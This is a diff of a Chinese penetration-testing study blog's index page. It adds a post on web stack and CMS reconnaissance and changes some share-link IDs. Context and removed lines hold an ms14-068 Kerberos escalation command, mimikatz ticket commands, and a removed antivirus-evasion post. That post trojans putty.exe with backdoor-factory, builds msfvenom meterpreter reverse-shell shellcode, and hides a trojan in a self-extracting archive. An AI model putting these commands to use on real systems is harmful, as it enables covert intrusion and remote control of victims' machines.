@@ -64,6 +64,45 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-Web网站框架安全" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/09/12/Web%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/" class="article-date">
+  <time datetime="2021-09-12T14:44:46.000Z" itemprop="datePublished">2021-09-12</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/12/Web%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/">Web网站框架安全</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>基础知识：<br>【网站搭建】<br>     由操作系统、web源码、中间件、数据库四大部分组成<br>     ASP+Access<br>     php+mysql<br>     aspx+mssql<br>     jsp+mssql,oracle<br>     python+mongodb<br>下载phpstudy(同样还有宝塔，wmap，Inmap)，一体化集合php+mysql+apache/nginx/iis，模拟搭建网站<br>【操作系统】<br>1、Windows   大小写不敏感<br>2、Linux(70%)   大小写敏感<br>nmap -O [IP或域名]<br>【web源码】<br>1、CMS：开源的网站内容管理系统   开放[开源]：能下载到的   内部：见不到，找不到<br>     关于源码获取的相关途径：搜索(国内dedecms、74cms、phpcms等  国外：WordPress)，咸鱼淘宝(花钱买)，第三方源码站<br>2、脚本类型：asp、aspx、php、jsp、python等<br>     不同网站源码采用不同脚本类型去编写，脚本类型选择上不同造成安全漏洞不同，某些语言能造成的安全漏洞也不一样<br>3、目录结构：后台目录模板目录、数据库目录、数据库配置文件等<br>4、网站系统的应用分类：商城（逻辑漏洞）、论坛（上传漏洞）、博客、第三方(查IP、查域名)（命令执行漏洞）、其他<br>      网站功能决定漏洞类型<br>5、框架<br>【中间件常见安全问题与防护】<br>1、配置导致安全问题<br>      IP 或域名解析目录对应下的存在的安全问题<br>      域名访问，IP访问<br>      脚本后缀解析<br>2、安全配置防护<br>      常见防护中的IP域名验证</p>
+<p>C:\WINDOWS\Microsoft.NET\Framework\v1.1.4322\aspnet_isapi.dll  asp<br>C:\WINDOWS\system32\inetsrv\asp.dll   axd</p>
+<p>查看md5值命令：certutil -hashfile C:\Users\kayven\Desktop\none.gif md5<br>【演示实验】<br>    域名解析目录与IP解析目录安全<br>    文件后缀解析设置    中国菜刀<br>    常见安全测试中的安全防护<br>    WEB 后门与用户及文件权限<br>    CMS识别(人工、在线工具、平台)<br>【涉及资源】<br><a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org/</a><br><a target="_blank" rel="noopener" href="https://w.ddosi.workers.dev/">https://w.ddosi.workers.dev/</a>    雨苁<a target="_blank" rel="noopener" href="http://www.ddosi.com/">www.ddosi.com</a><br><a target="_blank" rel="noopener" href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com/</a>     在线cms识别</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/09/12/Web%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/" data-id="ckuz6wd6y00075kvj2lm53hqc" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-网站数据包结构分析" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/09/10/%E7%BD%91%E7%AB%99%E6%95%B0%E6%8D%AE%E5%8C%85%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/" class="article-date">
@@ -110,7 +149,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/10/%E7%BD%91%E7%AB%99%E6%95%B0%E6%8D%AE%E5%8C%85%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/" data-id="ckutpr5xc0011pkvjaycx4t7t" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/10/%E7%BD%91%E7%AB%99%E6%95%B0%E6%8D%AE%E5%8C%85%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/" data-id="ckuz6wd7s00135kvj8t0t937o" class="article-share-link">Share</a>
       
       
     </footer>
@@ -153,7 +192,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/07/WEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" data-id="ckutpr5rh0008pkvj8hiwbqyr" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/07/WEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" data-id="ckuz6wd6y00085kvj2hqeflsj" class="article-share-link">Share</a>
       
       
     </footer>
@@ -198,7 +237,7 @@
 <li><p>做信息搜集</p>
 </li>
 <li><p>用ms14-068向域控提权</p>
-<p>ms14068 -u <a href="mailto:&#x69;&#x6c;&#117;&#64;&#105;&#x6c;&#x75;&#x2e;&#x63;&#111;&#109;">&#x69;&#x6c;&#117;&#64;&#105;&#x6c;&#x75;&#x2e;&#x63;&#111;&#109;</a> -d 192.168.1.141 -s S-1-5-21-542716808-1865610110-2530282010-1105 -p 123123q.</p>
+<p>ms14068 -u <a href="mailto:&#x69;&#x6c;&#x75;&#x40;&#105;&#x6c;&#x75;&#46;&#x63;&#x6f;&#109;">&#x69;&#x6c;&#x75;&#x40;&#105;&#x6c;&#x75;&#46;&#x63;&#x6f;&#109;</a> -d 192.168.1.141 -s S-1-5-21-542716808-1865610110-2530282010-1105 -p 123123q.</p>
 <p>注入之前: 需要清除票据</p>
 <p>​    CMD: klist purge 清除票据 | klist 查看票据</p>
 <p>​    mimikatz: kerberos::purge 清除票据 | kerberos::list 查看票据</p>
@@ -266,7 +305,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/04/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" data-id="ckutpr5wh000ypkvj5l78a6qy" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/04/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" data-id="ckuz6wd7q000z5kvjfj5e6t16" class="article-share-link">Share</a>
       
       
     </footer>
@@ -341,7 +380,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/02/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/" data-id="ckutpr5xe0012pkvj8zol29tg" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/02/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/" data-id="ckuz6wd7s00125kvjh3rtd9de" class="article-share-link">Share</a>
       
       
     </footer>
@@ -416,7 +455,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/31/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/" data-id="ckutpr5w8000upkvj7uan22fm" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/31/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/" data-id="ckuz6wd7l000u5kvj129rfyut" class="article-share-link">Share</a>
       
       
     </footer>
@@ -501,7 +540,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/26/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/" data-id="ckutpr5ws0010pkvj74dtbntg" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/26/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/" data-id="ckuz6wd7r00115kvj5p5jhvo1" class="article-share-link">Share</a>
       
       
     </footer>
@@ -556,7 +595,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/24/empire%E4%BC%9A%E8%AF%9D%E4%BC%A0%E9%80%92%E5%92%8C%E4%BB%A3%E7%90%86/" data-id="ckutpr5rl000cpkvj2nihcjoe" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/24/empire%E4%BC%9A%E8%AF%9D%E4%BC%A0%E9%80%92%E5%92%8C%E4%BB%A3%E7%90%86/" data-id="ckuz6wd70000a5kvj6ylvajne" class="article-share-link">Share</a>
       
       
     </footer>
@@ -620,7 +659,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/21/empire%E6%8F%90%E6%9D%83%E5%92%8C%E6%8C%81%E4%B9%85%E5%8C%96/" data-id="ckutpr5rj000bpkvjgvt04q1x" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/21/empire%E6%8F%90%E6%9D%83%E5%92%8C%E6%8C%81%E4%B9%85%E5%8C%96/" data-id="ckuz6wd72000c5kvjdkoe051m" class="article-share-link">Share</a>
       
       
     </footer>
@@ -690,64 +729,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/18/empire%E5%9F%BA%E6%93%8D/" data-id="ckutpr5ri0009pkvjfytd7z7q" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-免杀收尾和empire" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/08/16/%E5%85%8D%E6%9D%80%E6%94%B6%E5%B0%BE%E5%92%8Cempire/" class="article-date">
-  <time datetime="2021-08-16T05:53:22.000Z" itemprop="datePublished">2021-08-16</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/16/%E5%85%8D%E6%9D%80%E6%94%B6%E5%B0%BE%E5%92%8Cempire/">免杀收尾和empire</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="免杀技术"><a href="#免杀技术" class="headerlink" title="免杀技术"></a>免杀技术</h2><p>the-backdoor-factory:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">常用:</span><br><span class="line">-c：code cave(代码裂缝)</span><br><span class="line">-l：代码裂缝⼤⼩</span><br><span class="line">-s：选择使⽤ payload 类型</span><br><span class="line">-H：选择回连服务器地址</span><br><span class="line">-P：回连服务器端⼝</span><br><span class="line">-J：使⽤多代码裂缝</span><br><span class="line"></span><br><span class="line">基操:</span><br><span class="line">1. .&#x2F;backdoor.py -f putty-32bit.exe -S    检测是否可以插入shellcode</span><br><span class="line">2. .&#x2F;backdoor.py -f putty-32bit.exe -c -l 500  探测代码裂缝</span><br><span class="line">3. .&#x2F;backdoor.py -f &#x2F;root&#x2F;putty.exe -s show  列出payload</span><br><span class="line">4. .&#x2F;backdoor.py -f ~&#x2F;putty.exe -s iat_reverse_tcp_stager_threaded -H 10.211.55.2 -P 3333 -J -o payload.exe  生成木马</span><br><span class="line"></span><br><span class="line">自定义shellcode注入:</span><br><span class="line">生成shellcode </span><br><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.135 lport&#x3D;4444 -e x86&#x2F;shikata_ga_nai -i 15 -f raw -o shellcode.c</span><br><span class="line">注入shellcode</span><br><span class="line">.&#x2F;backdoor.py -f putty-32bit.exe -s user_supplied_shellcode_threaded -U shellcode.c -H 192.168.1.135 -P 4444 -o pyload.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>phantom-evasion:</p>
-<p><code>如果出现PKCS12TYPE错误,修改setup/Phantom_lib.py 中PKCS12TYPE,把TYPE去掉</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[+] MODULE DESCRIPTION:</span><br><span class="line"></span><br><span class="line">  Pure C reverse tcpstager </span><br><span class="line">  compatible with metasploit and cobaltstrike beacon</span><br><span class="line">  [&gt;] Local process stage execution type:</span><br><span class="line">   &gt; Thread    线程的方式                      </span><br><span class="line">   &gt; APC                             </span><br><span class="line"></span><br><span class="line">  [&gt;] Local Memory allocation type(内存分配的类型):</span><br><span class="line"></span><br><span class="line">   &gt; Virtual_RWX    可读可写可执行                 </span><br><span class="line">   &gt; Virtual_RW&#x2F;RX  可读可写&#x2F;可读可执行                 </span><br><span class="line">   &gt; Virtual_RW&#x2F;RWX 可读可写&#x2F;可读可写可执行              </span><br><span class="line">   &gt; Heap_RWX       可读可写可执行                  </span><br><span class="line"></span><br><span class="line">  [&gt;] AUTOCOMPILE format: exe,dll         自动编译后可生成的格式</span><br><span class="line">  Junkcode: 花指令</span><br></pre></td></tr></table></figure>
-
-<p>自解压</p>
-<p>SFX: 把压缩包生成为exe可执行程序, 执行后会自动解压</p>
-<p>用到的工具: winrar 或者有自解压选项的压缩工具</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">工具：</span><br><span class="line">– winrar、ico图标、木马</span><br><span class="line">§ 步骤：</span><br><span class="line">– 1.右键添加压缩文件</span><br><span class="line">– 2.创建自解压文件栏✔（SFX) – 3.点击高级--&gt;点击自解压选项</span><br><span class="line">– 4.点击更新--&gt;覆盖所有文件夹</span><br><span class="line">– 5.点击设置--&gt;加入图标路径、木马路径</span><br><span class="line">– 6.点击文本和图表--&gt;添加ico图标</span><br><span class="line">– 7.点击模式--&gt;全部隐藏</span><br><span class="line">– 8.确定，然后隐藏文件拓展名</span><br></pre></td></tr></table></figure>
-
-<p>数字签名</p>
-<p>资源修改: resource hacker –&gt; 修改资源, 图标,版本信息, 程序内容等…</p>
-<h2 id="empire"><a href="#empire" class="headerlink" title="empire"></a>empire</h2><p>安装: </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kali:</span><br><span class="line">sudo apt install powershell-empire</span><br><span class="line">sudo powershell-empire</span><br><span class="line"></span><br><span class="line">github克隆:</span><br><span class="line">git clone --recursive https:&#x2F;&#x2F;github.com&#x2F;BC-SECURITY&#x2F;Empire.git</span><br><span class="line">cd Empire</span><br><span class="line">sudo .&#x2F;setup&#x2F;install.sh</span><br><span class="line">sudo poetry install</span><br><span class="line">sudo poetry run python empire</span><br><span class="line"></span><br><span class="line">在python的框架中碰到 --&gt; requirements.txt ,优先安装这个 pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
-
-<p>314 modules currently loaded —&gt; empire模块</p>
-<p>0 listeners currently active —&gt; 存活的监听器</p>
-<p>0 agents currently active    —&gt; 存活的用户情况</p>
-<p>在empire中, 第一件事就是生成监听器<br>指令:<br>help            帮助命令<br>agents            查看用户,进入用户菜单<br>creds            存放用户的凭据信息<br>interact        进入到交互模式<br>list               列出存活的用户或者监听器<br>active listener    与存活的监听器进行交互<br>load            加载非标准的模块目录<br>searchmodule    搜索模块<br>set                设置参数<br>show            显示参数<br>uselistener        使用监听器(创建)<br>usemodule         使用模块<br>usestager        使用stager</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/16/%E5%85%8D%E6%9D%80%E6%94%B6%E5%B0%BE%E5%92%8Cempire/" data-id="ckutpr5rv000spkvjhz827y4o" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/18/empire%E5%9F%BA%E6%93%8D/" data-id="ckuz6wd71000b5kvj6rwqfmjh" class="article-share-link">Share</a>
       
       
     </footer>
@@ -793,6 +775,10 @@
       <ul>
         
           <li>
+            <a href="/2021/10/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E5%AE%89%E5%85%A8/">文件上传漏洞的上传逻辑安全</a>
+          </li>
+        
+          <li>
             <a href="/2021/10/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%90%8E%E7%AB%AF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/">文件上传漏洞的后端绕过方法</a>
           </li>
         
@@ -806,10 +792,6 @@
         
           <li>
             <a href="/2021/10/05/sql%E6%BC%8F%E6%B4%9E%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E5%92%8C%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/">sql漏洞查询方式和报错盲注</a>
-          </li>
-        
-          <li>
-            <a href="/2021/10/01/sql%E9%AB%98%E4%BD%8E%E6%9D%83%E9%99%90%E6%B3%A8%E5%85%A5%E5%92%8C%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/">高低权限注入和敏感文件读写</a>
           </li>
         
       </ul>
